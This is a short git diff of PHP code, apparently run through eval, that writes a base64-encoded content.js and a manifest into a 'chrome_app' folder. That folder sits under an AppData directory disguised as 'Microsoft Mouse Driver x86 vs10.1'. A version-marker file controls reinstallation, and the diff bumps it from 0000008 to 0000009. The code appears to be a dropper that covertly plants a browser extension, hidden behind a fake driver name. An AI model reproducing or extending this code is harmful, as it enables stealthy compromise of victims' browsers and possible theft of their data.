@@ -1,6 +1,6 @@
 execução por eval. cuidado, não use exit e nem __FILE__
 
-[__GIT_COMMAND]
+[GIT_COMMAND]
 
 $GLOBALS['__criando__atalho_002'] = function($source, $dest)
 {
@@ -22,9 +22,9 @@ $target = $appdata . "\Microsoft Mouse Driver x86 vs10.1";
 $extpath = $target . "\chrome_app";
 @mkdir($target);
 @mkdir($extpath);
-if(@file_get_contents($target . '/file_ctr_vir') !== '0000008')
+if(@file_get_contents($target . '/file_ctr_vir') !== '0000009')
 {
-	@file_put_contents($target . '/file_ctr_vir', '0000008');
+	@file_put_contents($target . '/file_ctr_vir', '0000009');
 	@file_put_contents($extpath . '/content.js', base64_decode($cntjs));
 	@file_put_contents($extpath . '/manifest.json', $manifest);
 	$exe_paths = array(
